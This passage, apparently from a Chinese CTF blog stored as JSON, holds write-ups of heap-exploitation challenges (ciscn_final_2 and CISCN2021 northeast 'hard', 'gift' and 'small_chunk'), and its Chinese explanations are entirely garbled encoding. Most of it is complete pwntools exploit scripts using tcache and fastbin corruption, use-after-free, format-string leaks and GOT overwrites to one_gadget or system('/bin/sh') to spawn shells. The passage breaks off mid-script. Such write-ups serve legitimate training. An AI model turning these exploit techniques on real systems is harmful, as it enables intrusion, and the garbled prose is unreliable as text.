ç”±äºåªæœ‰éƒ¨åˆ†libcåœ°å€ï¼Œæ‰€ä»¥ä¸¤ä¸ªé€‰æ‹©ï¼Œä¸€æ˜¯çˆ†ç ´ï¼Œ0x7fxx--------ï¼Œéœ€è¦å¤§æ¦‚çˆ†ç ´ä¸€ä¸ªå­—èŠ‚ï¼Œ0xffæ¬¡ã€‚äºŒæ˜¯åˆ©ç”¨chunkä¸Šæ®‹ç•™çš„åœ°å€ï¼Œç»“åˆtcache upå’ŒUAFç›´æ¥æ”¹åé¢å››ä¸ªå­—èŠ‚ï¼Œç›´æ¥ç”³è¯·åˆ°æˆ‘ä»¬æƒ³è¦åœ°æ–¹ã€‚è¿™é‡Œç”¨ç¬¬äºŒç§æ–¹æ³•\n\nâ‘¡ä½†æ˜¯æœ€å‘çˆ¹çš„å°±æ˜¯ï¼Œscanfç”³è¯·å †å—å•Šï¼Œå…·ä½“ä¸çŸ¥é“ç”³è¯·å¤šå¤§ï¼Œä½†æ˜¯ç¨‹åºä¸­å¯ä»¥è¾“å…¥99ä¸ªå­—ç¬¦ï¼Œè°ƒè¯•äº†å¥½ä¹…ï¼ŒæŒ‡å®šä¼šç”³è¯·å †å—ã€‚\n\nâ‘¢å¦‚æœç›´æ¥åˆ©ç”¨int_chunkä¸Šæ®‹ç•™çš„libcåœ°å€ï¼Œä½†æ˜¯è¿™æ—¶å€™int_chunkå·²ç»è¢«æ”¾å…¥åˆ°unsortedbinä¸­ï¼Œç»“åˆtcache upå’ŒUAFåŠ¿å¿…ä¼šä¿®æ”¹int_chunkçš„fdï¼Œç„¶åå°±ä¼šé€ æˆunsortedbinè¢«ç ´åï¼Œå†åŠ ä¸Šä¹‹åçš„scanfç”³è¯·å †å—ï¼Œä¸ä¼šä»0x20å’Œ0x30çš„tcacheä¸­ç”³è¯·ï¼Œå¾—ï¼Œç›´æ¥å´©æºƒï¼š\n\nmalloc(): memory corruption: 0x00007fae88dc8c10 ***\\n\"\n\nâ‘£ç„¶åæˆ‘åˆæƒ³åˆ°è¦ä¸ä¸ºscanfé¢„ç•™ä¸€ä¸ªchunkåˆ°tcacheä¸­ï¼Ÿè¿™æ ·å°±ä¸ä¼šä»unsortedbinä¸­åˆ‡å‰²äº†ã€‚ç»“æœè°ƒå¥½ä¹…æ²¡è°ƒå‡ºæ¥ï¼Œæœæ–­æ”¾å¼ƒã€‚\n\nâ‘¤æœ€åçµå…‰ä¸€é—ªï¼Œæƒ³åˆ°å¹²å˜›ä¸ç›´æ¥åŠ«æŒtcacheç»“æ„ä½“ï¼Œç”±äºint_chunkè¢«æ”¾å…¥unsortedbinä¸­ï¼Œé‚£ä¹ˆå¦‚æœint_chunkä¹Ÿåœ¨tcacheä¸­ï¼Œå°±å¯ä»¥ä½¿å¾—tcacheç»“æ„ä½“ä¸­0x30é“¾è¡¨ä¸Šç•™ä¸‹main_arena+96çš„æŒ‡é’ˆäº†å•Šã€‚è¿™æ ·å†ç”³è¯·short_chunkåˆ°è¿™é‡Œï¼Œç›´æ¥ä¿®æ”¹æŒ‡é’ˆï¼Œå†ç”³è¯·int_chunkå°±ä¼šç”³è¯·åˆ°æˆ‘ä»¬ä¿®æ”¹çš„åœ°æ–¹ï¼Œè¿™æ ·å°±ä¸ä¼šé€ æˆunsortedbinç ´åã€‚\n\nâ–²çœ‹äº†å¤§ä½¬çš„ï¼Œè¿˜æ˜¯ç›´æ¥å¡«æ»¡tcacheçœäº‹ï¼Œä¸ç ´åunsortedbinã€‚\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./ciscn_final_2\"\n#libc_file = \"/lib/x86_64-linux-gnu/libc-2.26.so\"\n#libc_file = \"\"\n\n#libcsearcher use\n#32bit:malloc_hook = main_arena-0x18\n#32bit:main_arena+56(unsortedbin_addr)\n#64bit:main_arena+96(unsortedbin_addr)//88 aslo have\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 1\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    #libc = ELF(libc_file)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"29139\")\n    elf = ELF(binary)\n    #libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \"which command?\\n> \"\n\n\ndef add(Type, con):\n    sla(menu, \"1\")\n    sla(\">\", str(Type))\n    sa(\"your inode number:\", con)\n\ndef delete(Type):\n    sla(menu, \"2\")\n    sla(\">\", str(Type))\n\ndef show(Type):\n    sla(menu, \"3\")\n    sla(\">\", str(Type))\n\ndef exit(con):\n    sla(menu,\"4\")\n    #sa(\"at last?\\n\",con)\n\n\nadd(1,\"B\")\ndelete(1)\n\nfor i in range(0,5):\n    add(2,\"A\")\n    delete(1)\n\nshow(1)\nru(\"type inode number :\")\nheap_low_four = int(ru(\"\\n\"))\nif(heap_low_four<0):\n    heap_low_four += 0x100000000\nlog.info(\"heap_low_four:0x%x\"%heap_low_four)\n\nfor i in range(0,3):\n    add(1,str(heap_low_four))\n    delete(2)\n\nadd(2,str(heap_low_four-0x10))\nadd(2,str(heap_low_four-0x10))\nadd(2,str(0x4b1))\n\n#fill\nfor i in range(0,32):\n    add(2,str(0x51))\n\ndelete(2)\nadd(1,str(heap_low_four))\nadd(1,str(heap_low_four))\ndelete(1)\nshow(1)\nru(\"type inode number :\")\n\nmalloc_hook = int(ru(\"\\n\"))- 96 - 0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\n\nlibc_base_four = malloc_hook - obj.dump('__malloc_hook')\nif(libc_base_four<0):\n    libc_base_four += 0x100000000\nheap_base = heap_low_four-0x260\nlog.info(\"libc_base_four:0x%x\"%libc_base_four)\n__IO_2_1_stdin_fileno_addr = libc_base_four+obj.dump(\"_IO_2_1_stdin_\")+0x70\n\nadd(1,str(malloc_hook+0x10+96))\ndelete(2)\nadd(2,str(heap_base+0x50+0x8))\nadd(2,str(__IO_2_1_stdin_fileno_addr))\nadd(2,str(__IO_2_1_stdin_fileno_addr))\nadd(1,str(666))\n\npause()\n\np.sendline(\"4\")\np.interactive()\n```\n\nè¿™é‡Œæˆ‘éƒ½æ˜¯int_chunkæ‹¿æ¥æ³„éœ²åœ°å€å’Œåˆ©ç”¨ï¼Œshort_chunkæ¥æ‰“è¾…åŠ©ã€‚\n\nâ˜…å¦å¤–è®°å½•ä¸‹tcacheæ–¹é¢çš„ï¼Œtcacheæ ¹æºåœ¨äºtcacheç»“æ„ä½“ï¼Œæ‰€ä»¥å¦‚æœtcacheçš„binä¸­å¦‚ä¸‹ï¼š\n\n0x20[]:chunkA->chunkA.fd=1\n\né‚£ä¹ˆå¦‚æœè¿™æ—¶å€™ç”³è¯·chunkAçš„åŒæ—¶ä¿®æ”¹chunkA.fd=2ï¼Œå¯¹äºçš„tcacheçš„binä¸­åªä¼šæ˜¯ï¼š\n\n0x20[]:chunkA.fd=1ï¼Œè€Œä¸æ˜¯chunkA.fd=2ï¼Œå› ä¸ºåœ¨mallocæ—¶å°±å·²ç»å°†chunkA.fd=1æ”¾åˆ°tcacheç»“æ„ä½“ä¸­äº†ï¼Œå†ä¿®æ”¹chunkA.fdæ˜¯æ²¡æœ‰æ„ä¹‰çš„ï¼Œåªèƒ½ä¿®æ”¹tcacheç»“æ„ä½“æ‰è¡Œã€‚\n\nâ˜…è¿˜æœ‰tcacheçš„coutå­—æ®µä¸€ç›´æ˜¯ä¸ªè°œï¼Œå¦‚æœcout>7ï¼Œtcacheçš„maxå®å®šä¹‰æ²¡æœ‰è¢«æ”¹ï¼Œé‚£ä¹ˆé‡Šæ”¾åçš„chunkæ˜¯ä¸ä¼šè¿›å…¥å¯¹äºçš„tcacheçš„binä¸­ã€‚ä½†æ˜¯å¦‚æœcout<7æˆ–è€…<0ï¼Œæ˜¯ä¸ä¼šæœ‰å…¶ä»–å½±å“çš„ï¼Œåªä¼šçœ‹tcacheç»“æ„ä½“ä¸­å¯¹åº”binçš„é“¾è¡¨ä¸­æ˜¯ä¸æ˜¯0x0ã€‚æ˜¯å°±å½“æ²¡æœ‰ï¼Œæœ‰æ•°æ®åˆ™å°±æœ‰chunkåœ¨è¯¥binä¸­ï¼Œä¸ç®¡coutæ˜¯å¤šå°‘(<7)ï¼Œå¹¶ä¸”mallocæˆ–è€…freeåä¼šå¯¹coutå¯¹åº”åŠ å‡ã€‚(ä¸åŒlibcç‰ˆæœ¬å¥½åƒåˆä¸å¤ªä¸€æ ·ï¼Œå…·ä½“è°ƒè¯•)\n","tags":["åˆ·é¢˜"],"categories":["PWN"]},{"title":"CISCN2021ä¸œåŒ—èµ›åŒºå¤ç°","url":"/2021/08/14/CISCN2021ä¸œåŒ—èµ›åŒºå¤ç°/","content":"\nå¤ç°ä¹‹å‰ï¼Œå…ˆéª‚ä¸¤å¥ã€‚SBå½¢å¼ï¼ŒSBçš„è‡ªå·±ã€‚\n\n1.hard:è¿™é“é¢˜ç›®æœ€ä»–ä¸«SBï¼Œä¸Šæ¥è¿è¡Œä¸èµ·æ¥ï¼Œç¯å¢ƒè°ƒåŠå¤©ï¼Œè¿˜æ˜¯è¿è¡Œä¸èµ·æ¥ï¼Œå†åŠ ä¸ŠVPNå´©æºƒï¼Œä¸€ç›´è¿ä¸ä¸Šï¼Œè¿˜ä»¥ä¸ºé¢˜ç›®æœ¬èº«ä¼˜ç‚¹é—®é¢˜ï¼Œåªèƒ½å…ˆæ”¾å¼ƒï¼Œè½¬å¤´å¸®å¿™å»äº†ã€‚åæ¥checksecä¸€ä¸‹æ‰å‘ç°ä¾èµ–æ˜¯./lib/ï¼Œä¹Ÿå°±æ˜¯å½“å‰æ–‡ä»¶ä¸‹éœ€è¦åˆ›å»ºä¸€ä¸ªlibæ–‡ä»¶å¤¹ï¼Œé‡Œé¢æ”¾ä¸Šld-linux-x86-64.so.2æ‰èƒ½è¿è¡Œï¼Œæˆ‘å¯å»ä»–å¤§çˆ·çš„ã€‚\n\nç»™çš„åˆ†æŒºé«˜ï¼Œåé¢æƒ³äº†æƒ³ä¹Ÿä¸ç®—éš¾ï¼Œä¸»è¦æœ‰ä¸‰ä¸ªç‚¹ã€‚\n\n(1)ä»»æ„å†™æ—¶ä¿®æ”¹çš„åœ°æ–¹é€‰æ‹©ã€‚\n\n(2)callocä¼ å…¥çš„nnumä¸º0æ—¶ï¼Œä¸ä¼šç”³è¯·ï¼Œä¼šè¿”å›0ã€‚åŒæ ·ä¹Ÿå…·å¤‡mmapçš„åŠŸèƒ½ã€‚\n\n(3)æœ€å¼€å§‹åˆå§‹åŒ–çš„æ—¶å€™ï¼Œsetbufä¼ å…¥çš„æ˜¯_IO_2_1_stdxxçš„ç»“æ„ä½“ï¼Œè¯¥ç»“æ„ä½“åœ¨è°ƒç”¨scanfï¼Œgetï¼Œprintfç­‰éœ€è¦åˆå§‹åŒ–ç¼“å†²åŒºçš„å‡½æ•°æ—¶ï¼Œä¼šå†™å…¥ç¼“å†²åŒºåœ°å€ï¼Œä¹Ÿå°±æ˜¯Libcä¸ŠæŸä¸ªåŒºåŸŸï¼Œå¯ä»¥å€Ÿæ­¤è”åˆsetbufæ¥æ³„éœ²åœ°å€ã€‚\n\næ¯”èµ›åå’Œå­¦é•¿äº¤æµä¸€ä¸‹ï¼Œæ‰æƒ³åˆ°æŠŠæœ€åçš„putsæ”¹æˆmainï¼Œæˆ‘çœŸä»–ä¸«æ˜¯ä¸ªSBï¼Œç„¶åå°±å¾ˆæ­£å¸¸äº†ã€‚\n\nâ‘ ç”±äºPartial Reloadï¼Œå¯ä»¥æ”¹gotè¡¨ï¼Œæ‰€ä»¥å…ˆä»»æ„å†™ï¼Œå°†putsæ”¹æˆmainï¼Œå¾ªç¯ç¨‹åºã€‚\n\nâ‘¡å°†exitæ”¹æˆinitå¤„çš„setbufçš„åœ°æ–¹ï¼Œå°†setbufæ”¹æˆprintfï¼Œè¿™æ ·å†è¿›å…¥initçš„åœ°æ–¹æ—¶ï¼Œå°±ä¼šæ‰“å°å¤„_IO_2_1_stdxxçš„ç»“æ„ä½“çš„å€¼ã€‚\n\nâ‘¢ç”±äºæ‰“å°_IO_2_1_stdxxçš„ç»“æ„ä½“çš„å€¼æ—¶ï¼Œæ‰“å°å¤„flagä¹‹åå°±ä¼šè¢«0x00æˆªæ–­ï¼Œæ‰€ä»¥éœ€è¦ä¿®æ”¹flagå¤„çš„å€¼ã€‚è¿™é‡Œé€šè¿‡callocè¾“å…¥è¿‡å¤§çš„nnumæ—¶ä¼šä»mmapç”³è¯·å†…å­˜ï¼Œè¿”å›çš„æ˜¯mmapç©ºé—´ï¼Œä¹Ÿå°±æ˜¯libcä¸Šçš„åœ°å€ã€‚åŒæ—¶ç”±äºå…³é—­äº†PIEï¼Œåç§»ä¸ä¼šå‘ç”Ÿæ”¹å˜ï¼Œæ‰€ä»¥ç›´æ¥è°ƒè¯•è®¡ç®—åç§»å³å¯ã€‚\n\nâ‘£æ³„éœ²åœ°å€åï¼ŒåŒæ ·åˆ©ç”¨callocç”³è¯·mmapçš„æ–¹æ³•ï¼Œå°†calloc_gotæ”¹æˆone_gadgetå³å¯ã€‚\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\n#from LibcSearcher import *\n\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./pwn\"\nlibc_file = \"/lib/x86_64-linux-gnu/libc-2.31.so\"\n#libc_file = \"\"\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\n#libcsearcher use\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\n\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 1\nif local:\n    p = process(binary)\n    #p = process(['./lib/ld-linux-x86-64.so.2', './tvstation'], env={\"LD_PRELOAD\":\"./lib/libc.so.6\"})\n    #p = process(binary, env={\"LD_PRELOAD\":\"./libc.so.6\"})\n    elf = ELF(binary)\n    libc = ELF(libc_file)\nelse:\n    p = remote(\"119.3.81.43\",\"49153\")\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\n\ndef write(offset, con):\n    ru(\": \")\n    sl(\"-1\")\n    ru(\": \")\n    sl(str(offset // 4))\n    ru(\":\")\n    sl(str(con))\n\ndef write2(offset, con):\n    ru(\": \")\n    sl(str(0x100000))\n    ru(\": \")\n    sl(str(offset // 4))\n    ru(\":\")\n    sl(str(con))\n\n\nmain_addr = 0x40078D\nputs_got = elf.got['puts']\nsetbuf_got = elf.got['setbuf']\nexit_got = elf.got['exit']\nprintf_plt = elf.plt['printf']\nsetbuf_plt = elf.plt['setbuf']\ncalloc_got = elf.got['calloc']\nsetbuf_init = 0x40086a\n\n\nlog.info(\"puts_got:0x%x\"%puts_got)\nlog.info(\"setbuf_got:0x%x\"%setbuf_got)\nlog.info(\"exit_got:0x%x\"%exit_got)\nlog.info(\"printf_plt:0x%x\"%printf_plt)\nlog.info(\"setbuf_plt:0x%x\"%setbuf_plt)\nlog.info(\"calloc_got:0x%x\"%calloc_got)\n\n\nwrite(puts_got,main_addr) #puts->main\nwrite(setbuf_got,printf_plt) #setbuf->printf\nwrite(setbuf_got+4,\"0\") #setbuf->printf\nwrite(exit_got,setbuf_init) #exit->setbuf\n\n\n# gdb.attach(p, \"b *(0x400854) \\n c\")\nIO_stdin4_mmap = 0x5EC974 #without PIE\nIO_stdin_1_libc = 0x1EBA03\nwrite2(IO_stdin4_mmap,0x11111111) #IO_stdin.flag->0x111111111fbad208b\nsla(': ', str(256))\nleak = u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8, \"\\x00\"))\nlibc_base = leak - IO_stdin_1_libc\nlog.info(\"libc_base:0x%x\"%libc_base)\none_gadget = libc_base + 0xe6c81\n\nru(\": \")\nsl(\"0\")\nru(\":\")\nsl(\"0\")\n\nwrite(calloc_got, one_gadget & 0xffffffff)\nru(\": \")\nsl(str(0))\np.interactive()\n```\n\n2.giftï¼šè¿™é“é¢˜ç›®æˆ‘è®¤æ ½ï¼Œç¡®å®æ˜¯åšé¢˜ç»éªŒå°‘äº†ï¼Œå¿˜äº†åˆ©ç”¨chunkå¤´+chunkè”åˆfastbinçš„FILOåŸåˆ™æ¥ä¿®æ”¹chunkå¤´äº†ã€‚\n\n(1)æ”¹chunkå¤´ï¼ŒåŠ ä¸ŠUAFæ¼æ´ï¼Œåˆ©ç”¨chunkå¤´é‡Œçš„å‡½æ•°æŒ‡é’ˆå’Œå‚æ•°ï¼Œæ”¹æˆprintfï¼Œç›´æ¥æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²åœ°å€ã€‚\n\n(2)åŒæ ·é“ç†ï¼Œç›´æ¥æ”¹å‡½æ•°æŒ‡é’ˆæŒ‡å‘å †ä¸Šä¼ªé€ çš„system_addrï¼Œåˆ©ç”¨å‚æ•°/bin/shç›´æ¥getshellã€‚\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\n#from LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./GIFT\"\nlibc_file = \"/lib/x86_64-linux-gnu/libc-2.23.so\"\n#libc_file = \"/lib/x86_64-linux-gnu/libc-2.27.so\"\n#libc_file = \"\"\n\n#libcsearcher use\n#32bit:malloc_hook = main_arena-0x18\n#32bit:main_arena+56(unsortedbin_addr)\n#64bit:main_arena+96(unsortedbin_addr)//88 aslo have\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 1\nif local:\n    p = process(binary)\n    #p = process(binary, env={\"LD_PRELOAD\":\"./libc.so.6\"})\n    elf = ELF(binary)\n    libc = ELF(libc_file)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"49153\")\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \">> \"\n\n\ndef add(size, con):\n    sla(menu, \"1\")\n    sla(\"size: \", str(size))\n    sa(\"content: \", con)\n\n\ndef delete(idx):\n    sla(menu, \"2\")\n    sla(\"index: \", str(idx))\n\nadd(0x28, \"\\x00\") #0\nadd(0x28, \"\\x01\") #1\n\ndelete(0)\ndelete(1)\n\nadd(0x18, \"%8$p%9$p\"+\"\\x30\") #2\ndelete(0)\nru(\"0x\")\nheap_base = int(p.recv(12),16)-0x10\nlibc_base = int(p.recv(14),16) - 0x55810\n# li(\"libc_base\", libc_base)\n# li(\"leak\", leak)\nlog.info(\"heap_base:0x%x\"%heap_base)\nlog.info(\"libc_base:0x%x\"%libc_base)\n\nsystem_addr = libc_base + libc.sym['system']\n\nadd(0x38, \"\\x03\") #3\nadd(0x38, \"\\x04\") #4\nadd(0x48,p64(system_addr))#5\n\nheap_system = heap_base+0x50+0x50+0x60+0x60+0x20+0x10\ndelete(3)\ndelete(4)\nadd(0x18,\"/bin/sh\\x00\"+p64(heap_system)) #6\ndelete(3)\np.interactive()\n```\n\n \n\n3.small_chunkï¼šæˆ‘è§‰å¾—å‡ºå¾—æœ€å¥½çš„æ˜¯è¿™é“é¢˜ï¼Œç¡®å®ä¸é”™ã€‚\n\n(1)é¦–å…ˆå¸ƒå±€ï¼Œåˆ©ç”¨off-by-oneåˆ¶ä½œå †å—é‡å ï¼Œç„¶åunsortedbinæ³„éœ²åœ°å€ã€‚\n\n(2)ç”±äºchunkåªèƒ½ç”³è¯·0x20å’Œ0x30ï¼Œæ‰€ä»¥æƒ³è¦æ‰“fastbin attackï¼Œä¸€èˆ¬æœ‰ä»¥ä¸‹ä¸‰ç§æ–¹æ¡ˆæ¥ç»•è¿‡ï¼š\n\nâ‘ è°ƒç”¨malloc_consolidateï¼Œæ•´ç†fastbinä¸­çš„chunkï¼Œä½¿å¾—fake_chunkçš„sizeå˜æˆåˆæ³•çš„ã€‚è¿™ä¸ªæœ‰ä¸‰ç§æƒ…å†µï¼Œå…·ä½“åˆ†æï¼Œæˆ‘éƒ½å°è¯•äº†ä¸ªéï¼Œè¿™é‡Œä¸€ä¸ªä¹Ÿç”¨ä¸äº†ã€‚\n\nâ‘¡åˆ©ç”¨unsotedbin attackï¼Œä¸è¿‡è¿™ä¸ªåªèƒ½é’ˆå¯¹0x7fçš„æƒ…å†µï¼Œè¿™é‡Œä¸å¤ªè¡Œã€‚\n\nâ‘¢åˆ©ç”¨fastbinYé“¾è¡¨ï¼Œå…ˆä¼ªé€ ä¸€ä¸ªfastbin_chunkçš„fdä¸º0x21æˆ–è€…0x31ï¼Œç”³è¯·å›æ¥fastbin_chunkï¼Œå°†0x21æˆ–è€…0x31ç•™åˆ°fastbinYé“¾è¡¨ä¸­ï¼Œè¿™æ ·åœ¨main_arenaä¸­å°±ç•™ä¸‹äº†ä¸€ä¸ª0x21æˆ–è€…0x31çš„æ•°å€¼ï¼Œå°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ•°å€¼ä¼ªé€ sizeæ¥ç”³è¯·chunkåˆ°main_arenaã€‚ä¹‹å0x20å’Œ0x30çš„fastbinæ‰“é…åˆï¼Œå°†top_chunkåœ°å€æ”¹æˆmalloc_hookçš„åœ°æ–¹ï¼Œå†ç”³è¯·å°±å¯ä»¥ç”³è¯·åˆ°malloc_hookäº†ã€‚\n\néœ€è¦æ³¨æ„çš„æ˜¯ï¼Œtop_chunkæ”¹åœ°å€ï¼Œéœ€è¦ç»•è¿‡ä¸€äº›æ£€æµ‹ï¼Œæ‰€ä»¥ä¸€èˆ¬ä¸¤ç§æƒ…å†µï¼š\n\nA.free_hook-0xb58\n\nB.malloc_hook-0x10\n\nä»¥ä¸Šä¸¤ç§çš„sizeåŸŸéƒ½æ˜¯ä¸€ä¸ªlibcåœ°å€ï¼Œèƒ½å¤Ÿé€šè¿‡æ£€æµ‹\n\nè¿™é‡Œç”±äºå †å—ä¸ªæ•°ä¸å¤Ÿç”¨ï¼Œæ‰€ä»¥é€‰æ‹©æ–¹æ¡ˆBï¼Œä¿®æ”¹å®Œmalloc_hookä¸ºone_gadgetåï¼Œå†ç”³è¯·å³å¯getshellã€‚\n\nâ–²è¿™é‡Œåœ¨åé¢çš„å¤ç°ä¸­æœ‰ç‚¹çŠ¯è ¢ï¼Œæœ¬æ¥æƒ³ç”³è¯·åˆ°bssæ®µä¸Šçš„ï¼Œæ²¡åŠæ³•æ³„éœ²elfåŸºåœ°å€ã€‚vmmapä¸€çœ‹ï¼Œå‘ç°heap_baseå’Œbssæ®µå›ºå®šåç§»0x1000ï¼Œè¿™å¯ç»™æˆ‘é«˜å…´åäº†ï¼Œç›´æ¥æ‰“bssæ®µçš„sizeåŒºåŸŸçš„åœ°æ–¹ã€‚æ‰“å®Œåï¼Œå…³æœºä¹‹åï¼Œå†æ‰“å¼€å‘ç°ä¸é¡¶ç”¨äº†ã€‚å¾—ï¼ŒASLRæˆ‘ä¹‹å‰ç»™å…³äº†ï¼Œå†å¼€å°±ä¸æ˜¯å›ºå®šåç§»äº†.....\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\n#from LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./small_chunk\"\nlibc_file = \"./libc.so.6\"\n#libc_file = \"/lib/x86_64-linux-gnu/libc-2.23.so\"\n#libc_file = \"\"\n\n#libcsearcher use\n#32bit:malloc_hook = main_arena-0x18\n#32bit:main_arena+56(unsortedbin_addr)\n#64bit:main_arena+96(unsortedbin_addr)//88 aslo have\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 1\nif local:\n    #p = process(binary)\n    p = process(binary, env={\"LD_PRELOAD\":\"./libc.so.6\"})\n    elf = ELF(binary)\n    libc = ELF(libc_file)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"49153\")\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \">> \"\n\n\ndef add(size):\n    sla(menu, \"1\")\n    sla(\"size: \", str(size))\n\ndef delete(idx):\n    sla(menu, \"2\")\n    sla(\"index: \", str(idx))\n\ndef show(idx):\n    sla(menu, \"3\")\n    sla(\"index: \", str(idx))\n\ndef edit(idx, con):\n    sla(menu, \"4\")\n    sla(\"index: \", str(idx))\n    sa(\"content: \",con)\n\nadd(0x18)#0\nadd(0x18)#1\ndelete(1)\ndelete(0)\nadd(0x18)\nshow(0)\nru(\"content: \")\nheap_base = 